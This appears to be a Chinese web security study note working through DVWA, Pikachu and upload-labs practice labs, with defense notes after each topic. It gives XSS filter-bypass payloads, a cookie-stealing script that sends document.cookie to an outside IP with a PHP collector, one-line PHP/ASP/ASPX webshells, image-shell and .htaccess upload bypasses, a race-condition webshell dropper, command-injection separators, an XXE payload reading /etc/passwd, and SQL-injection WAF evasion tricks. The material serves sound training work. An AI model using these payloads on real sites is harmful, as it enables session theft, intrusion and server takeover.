**源码**

```php
<?php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    
    // Feedback for end user
    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

可以看到`name`变量并没有进行任何过滤措施，只是检测了不为空就输出到本页面。因此这里随便填payload就可以了

```
<script>alert('2333')</script>
```



##### 反射 XSS Medium

**源码**

```php
<?php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}
?>
```

可以看到这里只是过滤了`<script>`标签，这里用到了**str_replace()**函数，这里是吧这个标签替换为空（即删除），那么就有很多姿势了！

> str_replace() ：函数替换字符串中的一些字符（区分大小写）
>
> 把字符串 "Hello world!" 中的字符 "world" 替换成 "Peter"：
>
> ```php
> <?php
> echo str_replace("world","Peter","Hello world!");
> ?>
> ```

**payload1**：（双写）

```
<sc<script>ript>alert('2333')</script>
```

**payload2**：（大小写）

```
<Script>alert('2333')</script>
```

**payload3**：（替换img等其他标签）

```
<img src=1 onerror=alert(/2333/)>
```



##### 反射 XSS high

**源码**

```php
<?php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}
?>
```

这里采用都是正则表达式过滤，但我们依然可以替换为其他的标签来进行弹窗

**payload**

```
<img src=1 onerror=alert(/2333/)>
<iframe onload=alert(/2333/)>
```



#### 2.存储型XSS攻击

##### 存储型 XSS LOW

这里就是进行留言就好了，payload

```
Name: Antlers
Message: <script>alert('XSS')</script>
```



##### 存储型 XSS Medium

查看源码发现Message字段没什么希望了，就尝试Name

**payload1**

```
Name: <img src=x onerror=alert('XSS')>
Message: www.qwe.com
```

**payload2**

因为`name`过滤规则的缺陷，同样使用**嵌套构造**和**大小写转换**也是可以Bypass的

```
Name: <Script>alert('XSS')</script>
Message: www.qwe.com

Name: <s<script>cript>alert('XSS')</script>
Message: www.qwe.com
```



##### 存储型 XSS high

`message`依然没什么希望，而`name`变量仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass：

```javascript
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

**payload**

```
Name: <img src=x onerror=alert('XSS')>
Message: www.sqlsec.com
```



#### 3.DOM型XSS攻击

##### DOM型 XSS LOW

由于DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的DOM节点：

```html
document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
document.write("<option value='' disabled='disabled'>----</option>");
```

这里的`lang`变量是通过`document.location.href`来获取到，并且没有任何过滤就直接URL解码后输出在了`option`标签中

所以我们URL填入payload

```javascript
?default=English <script>alert('XSS')</script>
```



##### DOM型 XSS Medium

**源码**

```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false){
        header ("location: ?default=English");
        exit;
    }
}
?>
```

这里对`default`变量进行了过滤，通过`stripos()` 函数查找`<script`字符串在`default`变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过`location`将URL后面的参数修正为`?default=English`，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。

**payload1**

闭合`</option>`和`</select>`，然后使用`img`标签通过事件来弹窗

```
?default=English</option></select><img src=x onerror=alert('XSS')>
```

**payload2**

直接利用`input`的事件来弹窗

```
?default=English<input onclick=alert('XSS') />
```



##### DOM型 XSS high

**源码**

```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?>
```

使用了白名单模式，如果`default`的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:`?default=English` ，这里只是对default的变量进行了过滤。

**payload1**

可以使用`&`连接另一个自定义变量来Bypass

```
?default=English&a=</option></select><img src=x onerror=alert('XSS')>
?default=English&a=<input onclick=alert('XSS') />
```

**payload2**

也可以使用`#`来Bypass

```
?default=English#</option></select><img src=x onerror=alert('XSS')>
?default=English#<input onclick=alert('XSS') />
```



#### XSS获取用户Cookie

**构造存储型 xss ，内容为传参，并指向自己的服务器：**

```html
<script>alert(/var url="47.111.139.22/eydm.php?msg="+zyc+document.cookie;Window.open(url,"_blank")/)</script>
```

服务器端进行接收数据，接收传参：

```php
<?php
$content = $_REQUEST["msg"];
$time = data(format:'Y-m-d H:i:s', time());
$file = "xss.txt";
$fp = fopen($file, mode:"a+");
fwrite($fp, string:$time . "|" . $content . "\r\n");
fclose($fp)
?>
```

或者我们搭建Cookie收集平台，这里就不演示了



#### XSS常用绕过

**常用测试语句**

```
<script>alert(/2333/)</script>
<img src=x onerror=alert(/2333/)>
<svg onload=alert(/2333/)>
<a href=javascript:alert(/2333/)>
```



#### XSS防御

因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种：

1. 过滤输入的数据，包括 `'`、`""`、`<`、`>`、`on*` 等非法字符
2. 对输出到页面的数据进行相应的编码转换，包括HTML实体编码、JavaScript编码等



### CSRF漏洞

**跨站请求伪造（CSRF）**：也被称为 one-click attack 或者 session riding，**通常缩写为 CSRF 或者 XSRF**。与XSS不同，XSS利用站点内的信任用户，而CSRF则通过**伪装**成受信任用户请求受信任的网站。

与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。



#### 原理

其实可以这样理解CSRF：攻击者利用目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。

举个例子，你想给某位用户转账100元，那么单击“转账”按钮后，发出的HTTP请求会与`http://www.xxbank.com/pay.php?user=x&money=100`类似。而攻击者构造链接（`http://wwwnbank.com/pay.php?user=hack&&money=100`），当目标用户访问了该URL后，就会自动向Hack账号转账100元，而目这只涉及目标用户的操作，攻击者并没有获取目标用户的 cookie或其他信息。



#### 利用CSRF漏洞

我们在测试平台的博客评论页面，用Burp Suite抓一个包，用自带的工具生成`CSRF POC`

![Markdown](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15139956301436.png)

在 `CSRF PoC生成器`的窗口中
我们可以修改这个表达里的内容，然后来测试CSRF是否存在。可以直接在浏览器中测试，也可以保存表单在本地的HTML文件中来测试

![Markdown](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15139956696303.png)

我们这里使用保存到本地的`HTML`文件来测试CSRF。
修改表单中`content`内容的值为:`This is CSRF Test by hacker`

![Markdown](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15139956884174.png)

现在如果管理员打开了这个表单，并且提交数据的话，如果存在CSRF漏洞，那么我们修改后的表单内容应该是可以正常提交的。

我们登录管理员账号，触发这个表单（需要使用同一个浏览器）

![Markdown](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15139957325071.png)

点击`提交请求`

![Markdown](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15139957585824.png)

可以看到修改后的表单内容也被提交了。



#### CSRF防御

有两种主流方法：

- 验证请求的Refererf值，如果Refererk是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。如果Refererk是其他网站域名或空白，就有可能是CSRF攻击，那么服务器应拒绝该请求，但是此方法存在被绕过的可能
- CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者不能伪造的信息。例如可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端验证token，如果请求中没有token或者 token的内容不正确，则认为该请求可能是CSRF攻击从而拒绝该
   请求。





### SSRF漏洞

**服务器端请求伪造（SSRF）**：是一种由攻击者构造请求，由服务端发起请求的安全漏洞 。一般情况下，**SSRF攻击的目标是外网无法访问的内部系统**（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。

简单的一句话来说SSRF漏洞就是：**利用一个可以发起网络请求的服务当跳板，来攻击内部系统**

**数据流：**攻击者----->服务器---->目标地址

例如，**让服务端从指定URL地址获取网页文本内容，加载指定地址的图片等**，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器



#### SSRF常见地方

- **通过URL地址分享网页内容**
- **转码服务**
- **在线翻译**
- **图片加载与下载**
- **从url挖掘**
- **CMS挖掘**



我们拿Pikachu上一道题来看

![image-20210316130736769](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316130736769.png)

当我们点击链接，发现服务器去访问了一个URL地址，我们尝试改为其他的

![image-20210316130906305](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316130906305.png)

我们随便访问一个地址，服务器就去访问这个地址栏

![image-20210316131251608](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316131251608.png)

如果我要是让服务器访问内网的文件链接，不就可以读取到本地文件？



#### SSRF可以做什么

- **端口探测**

  ![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/17595c92-f805-4870-be79-8c1ef1e100db.png)

- **读取服务器文件**

  - file_get_concat类型ssrf

    ![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/e7d34b59-0a30-4f70-a8b7-682c02c13c72.png)

  - curl类型ssrf

    ![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/3b1d93cb-5eca-498e-8221-ca64b011cb68.png)

- **Goper攻击内网mysql（无密码）**

  ssrf可以结合gopher协议攻击内网各种服务，如sql注入、struct2、redis等。这里我们以攻击内网空密码的mysql为例进行讲解。



#### SSRF漏洞修复建议

- 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求
- 限制不能访问内网的IP，以防止对内网进行攻击
- 屏蔽返回的详细信息





### 文件上传漏洞

**文件上传漏洞**是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。

**原理：**当服务器未对上传的文件进行严格的验证和处理时,如果上传的目标目录没有限制文件执行权限，导致所上传的动态文件可以被正常访问执行，就会造成文件上传漏洞。

文件上传漏洞的**必需条件**：

- 上传的脚本文件能够被Web容器解释执行
- 用户能够从Web上访问到此文件

**检测流程**

常规的文件上传检测流程

1. 前端用Js代码对上传的文件进行检测。
2. 服务器使用WAF对文件内容进行检测。
3. 后端代码进一步对文件类型及内容进行检测。
4. 利用服务器上的防御软件对文件内容进行检测。



#### 工具准备

- 一句话木马

  - PHP

    ```php
    <?php @eval($_post['pass']);?>
    ```

  - asp

    ```asp
    <%eval request ("pass")%>
    ```

  - aspx

    ```aspx
    <%@ Page Language="Jscript"%>< %eval(Request.Item["pass"],"unsafe");%>
    ```

- 图片马

  以PHP图片马为例，创建一个内容为`<?php @eval($_REQUEST['pass']);?>`的`1.txt`，准备一张图片`1.jpg`(大小在300kB以下)，生成名为`123.jpg`的图片马，命令行下执行命令`copy 1.txt + 1.jpg/b 123.jpg`。

  制作ASP图片马及ASPX图片马方法同上



#### 前端JS绕过

- 浏览器页面禁用JS
- 发送符合要求的文件，抓包改包就好了



#### MIME类型绕过

这个东西就是表示了文件的类型，在数据包中直接修改`Content-Type`字段，比如修改为合法`image/png`

![image-20210316155823677](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316155823677.png)



#### 文件头绕过

常见的文件头

- JPEG (jpg)：FFD8FF
- PNG (png)：89504E47
- GIF (gif)：47494638
- HTML (html)：68746D6C3E
- ZIP(zip)：504B0304
- RAR(rar)：52617221
- Adobe Photoshop (psd)：38425053
- MS Word/Excel (xls.or.doc)：D0CF11E0

有些网站不仅会检查MIME类型，还会检测文件头，我们需要结合使用，常用GIF89a

![image-20210316160613302](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316160613302.png)



#### 黑名单后缀过滤

服务器代码中限制了某些后缀的文件不允许上传，为了让我们的文件能被解析

- 后缀大小写
- 双写
- 后缀空格绕过
- 文件后缀加 `.` 绕过
- 后缀加 `/.` 绕过
- 使用其他被解析的后缀：.php .phtml .phps .php5 .pht



#### 白名单绕过

**%00 截断：**需要php版本小于5.3.4，php的magic_quotes_gpc为OFF状态

截断时候一定要万分注意%00后面加空格一定要

那为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节



#### 图片马

图片木马必须配合文件包含漏洞才能使用。

我们把一句话木马写入图片数据中，再利用服务器文件包含漏洞读出图片文件数据，图片马就可以被php解析了！



#### 利用解析规则绕过

htaccess是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，就比如`AddType application`参数。

我们上传覆盖当前目录的`.htaccess`文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析，让一些奇奇怪怪后缀的文件能被PHP解析。

**第一种：虽然好用，但是会误伤其他正常文件，容易被发现**

```
<IfModule mime_module>
AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
</IfModule>
```

**第二种：精确控制能被解析成php代码的文件，不容易被发现**

```
<FilesMatch "evil.gif">
SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
</FilesMatch>
```

**第三种：同1没太大区别**

```
<IfModule mime_module>
AddType application/x-httpd-php .gif
</IfModule>
```



#### 服务器系统绕过

在Windows服务器中，我们可在后缀名中加 `::$DATA` 绕过：



#### 二次渲染

服务器会对照片进行渲染，我们上传的图片数据会与渲染后的存在不同，因此我们准备的木马就会被“吃掉”

所以攻击步骤：

1. 上传一张图片
2. 下载经过服务器渲染的图片
3. 对比发现不变的地方
4. 将木马写入

**注意：**这种类型的漏洞有图片的格式问题：

- GIF

  渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell 即可

- PNG

  PNG没有GIF那么简单，需要将数据写入到PLIE数块或者IDAT数据块

- JPG

  JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试



**示例**

![img](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMDg4YmI0LWFiMjQtMS5wbmc)

成功上传含有一句话的111.gif，但是这并没有成功，于是我们将上传的图片下载到本地

![img](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMTI0YTk2LWFiMjQtMS5wbmc)

可以看到下载下来的文件名已经变化，所以这是经过二次渲染的图片，我们使用16进制编辑器将其打开，可以发现，我们在gif末端添加的php代码已经被去除。

![img](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMWVmMjhjLWFiMjQtMS5wbmc)

我们需要找到两次相同的部分，并将”马“写入到不会被渲染的地方！



#### 条件竞争

条件争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件党争漏洞。

在这里就是说，我们先上传一个**生成shell的文件**，在服务器完成安全检查并在删除它的间隙，**攻击者不断发起访问请求**访问该文件，让**这个文件在系统写入一个shell**，那么我们就可以搞事情了！

这类的Webshell内容大体如下：

```php
<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[x]);?>');?>
```

我们首先上传 shell.php 文件

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/16036848394730.png)

BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/16036138407749.png)

然后抓取访问 shell.php 的数据包：

```http
GET /upload/shell.php HTTP/1.1
Host: vul.xps.com:30009
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

依然使用 NULL 空值爆破：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/16036140058678.png)

最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的webshell：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/16036153403524.png)



#### move_uploaded_file 缺陷

这一题取材于 upload-labs 后面新增的题目：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/1603615449643.png)

```php
move_uploaded_file($temp_file, $img_path)
```

当 `$img_path` 可控的时候，还会忽略掉 `$img_path` 后面的 `/.` ，这一点发现最早是 [Smile](https://www.smi1e.top/) 师傅于 2019 年 2 月份提出来的，TQL !!!既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/16036161031022.png)



### 文件上传漏洞防御

- 通过白名单的方式进行判断文件后缀是否合格
- 对上传后的文件进行重命名，例如rand(10,99).data





### 暴力破解

暴力破解就比较好理解了，由于有些服务器端没有做限制，导致黑客可以不断猜测用户名、密码、验证码等。

暴力破解主要就是破解弱密码，一些复杂的就需要很长的时间，而破解出来的关键就是需要一个大一点的字典！

一般暴力破解就是拿出Burp Suite进行抓包爆破！

在爆破工具栏选择爆破点，选择模式就直接爆破就好了！

![image-20210316191638525](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316191638525.png)



**暴力破解防御手段**

- 对用户登录次数设置阈值，直接锁定账号
- 对同一个IP的短时间多次登录进行限制，锁定IP（如果多用户使用的是一个IP，就会造成其他用户也不能登录）



### 命令执行

应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、 shell_exec、 passthru、 popen、 proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。

我们用DVWA靶场的命令执行进行演示，直接从中级开始

这里有一个ping的命令执行，我们可以看到页面返回了ping信息，这意味着这个地方可以调用系统函数

![image-20210316192900497](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316192900497.png)

这里我们就需要解决**多条命令的连接执行**。这里我们使用管道符： `&`  进行连接

![image-20210316193424899](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316193424899.png)

这里就可以进行命令执行了！



#### 常用管道符

**Windows系支持的管道符**

- `|`：直接执行后面的语句
- `||`：如果前面执行的语句执行出错，则执行后面的语句，所以使用时，前面的语句只能为假
- `&`：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假
- `&&`：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真

**Linux系支持的管道符**

- `;`：执行完前面的语句再执行后面的
- `|`：显示后面语句的执行结果
- `||`：当前面的语句执行出错时，执行后面的语句
- `&`：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假
- `&&`：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真



#### 命令执行防御手段

- 尽量不要使用命令执行函数
- 客户端提交的变量在进入执行命令函数前要做好过滤和检测
- 在使用动态函数之前，确保使用的函数是指定的函数之一
- 对PHP语言来说，不能完全控制的危险函数最好不要使用





### 逻辑漏洞

逻辑漏洞就是由于业务设计缺陷产生的。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又有水平越权和垂直越权。

- **水平越权：**相同级別（权限）的用户或者同一角色中不同的用户之间，可以越权访问、修改或者刪除其他用户信息的非法操作。果出现此漏洞，可能会造成大批量数据的泄露，严重的甚至会造成用户信息被恶意簒改。
- **垂直越权：**就是不同级別之间的用户或不同角色之间用户的越权，比如**普通用户可以执行管理员**才能执行的功能。



**常见的逻辑漏洞有以下几类**：

- **支付订单：**在支付订单时，可以篡改价格为任意金额；或者可以改运费或其他费用为负数，导致总金额降低
- **越权访问：**通过越权漏洞访问他人信息或者操纵他人账号
- **重置密码：**在重置密码时，存在多种逻辑漏洞，比如利用 session覆盖重置密码、短信验证码直接在返回的数据包中等
- **竟争条件：**竟争条件常见于多种攻击场景中，比如前面介绍的文件上传漏洞。还有一个常见场景就是购物时，例如用户A的余额为10元，商品B的价格为6元，商品C的价格为5元，如果用户A分别购买商品B和商品C,那余额肯定是不够的。但是如果用户A利用竞争条件，使用多线程同时发送购买商品B和商品C的请求，可能会出现以下这几种结果。
  - 有一件商品购买失败
  - 商品都购买成功，但是只扣了6元



#### 越权访问防御

权访问漏洞产生的主要原因是没有对用户的身份做判断和控制，防护这种漏洞时，可以通过 session来控制。例如在用户登录成功后，将 username或uid写入到session中，当用户查看个人信息时，从 session中取出 username,而不是从GET或POST取 username,那么此时取到的 username就是没有被纂改的。





### XXE漏洞

介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20181120002645-e7aed0d2-ec17-1.png)

既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE

XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 **外部实体** ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(**盯好外部实体就行了**)，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）

> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素

**XML示例代码：**

```xml
<?xml version="1.0"?>			//这一行是 XML 文档声明
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>				// 这几行都是文档类型定义(DTD)
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
]>
<note>
    <to>Tove</to>
    <from>Jani</from>				// 文档元素
    <heading>Reminder</heading>
    <body>Antlers!</body>
</note>
```

其中，文档类型定义(DTD)可以是内部声明也可以引用外部DTD，如下所示：

- 内部声明DTD格式：<! DOCTYPE 根元素 [元素声明]>
- 引用外部DTD格式：<! DOCTYPE 根元素 SYSTEM "文件名">
- 在DTD中进行实体声明时，将使用 ENTITY关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明。
- 内部声明实体格式：<! ENTITY 实体名称 "实体的值">。
- 引用外部实体格式：<! ENTITY 实体名称 SYSTEN "URI">



**示例：**

这里演示pikachu靶场的XXE

![image-20210316202553097](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210316202553097.png)

这里HTTP请求的POST参数如下

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
	<!ELEMENT xxe SYSTEM "file:///etc/passwd"
]>
<xml>
<xxe>&xxe;</xxe>
</xml>
```

在POST参数中，关键语句为"file:///etc/passwd”，该语句的作用是通过file协议读取本地文件 /etc/passwd

页面回显

![在这里插入图片描述](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20191125175028242.png)



#### XXE漏洞分析

服务器端处理XML的代码如下：

```php
<?php
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
	$dom->loadXML($xmlfile);
	$xml = simplexml_import_dom($dom);
	$xxe = $xml->xxe;
	$str = "$xxe \n";
	echo $str;
?>
```

- 使用 file_get_contents 获得客户端输入的内容
- 使用 new DOMDocument() 初始化XML解析器
- 使用 loadxml(Sxmlfile)加载客户端输入的XML内容
- 使用 simplexml_import_dom(sdom) 获取XML文档节点，如果成功则返回 Simplexmlelement对象，如果失败则返回 FALSE
- 获取 Simplexmlelement 对象中的节点XXE，然后输出XXE的内容

可以看到，代码中没有限制XML引入外部实体，所以当我们创建一个包含外部实体的XML时，外部实体的内容就会被执行



#### XXE漏洞防御

- 禁止使用外部实体，例如 libxml_disable_entity_loader(true)
- 过滤用户提交的XML数据，防止出现非法内容





### WAF那些事
#### 介绍WAF

WAF（Web Application Firewall，Web应用防火墙），其通过一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF主要可以分为以下几类：

1. **软件型WAF**

   以软件形式装在所需保护的服务器上的WAF。由于安装在服务器上，所以可以接触到服务器上的文件，并且可以直接检测服务器上是否存在Webshell、是否有文件被创建等。

2. **硬件型WAF**

   以硬件形式部署在链路中，支持多种部署方式。当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截。

3. **云WAF**

   一般以反向代理的形式工作，通过配置NS记录或者CNAME记录，使对网站的请求报文优先经过WAF主机，经过WAF主机过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN。

4. **网站系统内置的WAF**

   网站系统内置的WAF可以说是网站系统中内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有以下几种情况：

   - 输入参数强制类型转换。
   - 输入参数合法性检测。
   - 关键函数执行之前，对经过代码流程的输入进行检测。
   - 对输入的数据进行替换过滤后再继续执行代码流程。

   网站系统内置的WAF与业务更契合，相对来说可以更少的收到误报、漏报。

#### 判断WAF

1. SQLMap

   使用SQLMap中自带的WAF识别模块可以识别出WAF的种类，但是如果WAF没有什么特征，则SQLMap只能识别处类型为：Generic。命令如下：

   ```
   python2 sqlmap.py -u "192.168.163.136" --identify-waf --batch
   ```

2. 手工判断

   直接在相应网站的URL后面加上最基础的测试语句即可。如果在URL后面增加了无影响的测试语句之后，如果被拦截则会表现为：页面无法访问、响应码不同、返回与正常请求网页时不同的结果等。

#### 绕过WAF

针对SQL注入而言：

1. **大小写混合**

   在规则匹配时只针对了特定大写或特定小写的情况，在实战中可通过混合大小写的方式进行绕过。

2. **URL编码**

   极少部分的WAF不会对普通字符进行URL解码，或者只进行一次编码。所以可进行一次编码或二次编码进行绕过。

3. **替换关键字**

   WAF采用替换或者删除某些敏感关键字时，如果只匹配一次则很容易进行绕过。

4. **使用注释**

   注释在截断SQL语句中用的比较多，在绕过WAF时主要使用其替代空格，适用于检测过程中没有识别注释或替换掉注释的WAF。

5. **多参数请求拆分**

   对于多个参数拼接到同一条SQL语句的情况，可以将注入语句分割插入。

   例如请求URL时，GET参数为如下格式：

   ```
   a=[input1] & b=[input2]
   ```

   将参数a和参数b拼接到SQL语句中，SQL语句如下所示：

   ```
   and a=[input1] and b=[input2]
   ```

   此时就可以将注入语句进行拆分，如下：

   ```
   a=union/*&b=*/select 1,2,3,4
   ```

   最终将参数a和参数b进行拼接，得到的SQL语句如下：

   ```
   and a=union /*and b=*/select 1,2,3,4
   ```

6. **HTTP参数污染**

   HTTP参数污染是指当同意参数出现多次，不同的中间件会解析为不同的结果，具体表示如下图：

   |                服务器中间件                 |           解析结果           |       举例说明       |
   | :-----------------------------------------: | :--------------------------: | :------------------: |
   |                ASP.NET / IIS                | 所有出现的参数值使用逗号连接 |    color=red,blue    |
   |                  ASP / IIS                  | 所有出现的参数值使用逗号连接 |    color=red,blue    |
   |                PHP / Apache                 |     仅最后一次出现参数值     |      color=blue      |
   |                 PHP / Zeus                  |     仅最后一次出现参数值     |      color=blue      |
   |         JSP,Servlet / Apache Tomcat         |      仅第一次出现参数值      |      color=red       |
   | JSP,Servlet / Oracle Application Server 10g |      仅第一次出现参数值      |      color=red       |
   |             JSP,Servlet / Jetty             |      仅第一次出现参数值      |      color=red       |
   |              IBM Lotus Domino               |     仅最后一次出现参数值     |      color=blue      |
   |               IBM HTTP Server               |      仅第一次出现参数值      |      color=red       |
   |        mod_perl, libapreq2 / Apache         |      仅第一次出现参数值      |      color=red       |
   |              Perl CGI / Apache              |      仅第一次出现参数值      |      color=red       |
   |          mod_wsgi(Python) / Apache          |      仅第一次出现参数值      |      color=red       |
   |                Python / Zope                |          转化为List          | color=['red','blue'] |

   上述中间件中，IIS比较容易利用，可以直接分割带逗号的SQL语句。在其余的中间件中，如果WAF只检测了同参数名中的第一个或最后一个，并且中间件特性正好取与WAF相反的参数即可绕过。下面以IIS为例：

   SQL语句：

   ```
   Inject = union select 1,2,3
   ```

   将SQL语句转换为以下格式：

   ```
   Inject = union/*&inject=*/select/*&inject=*/1&inject=2&inject=3
   ```

   那么最终IIS读入的参数值为：

   ```
   Inject = union/*,*/select/*,*/1,2,3
   ```

7. **生僻函数**

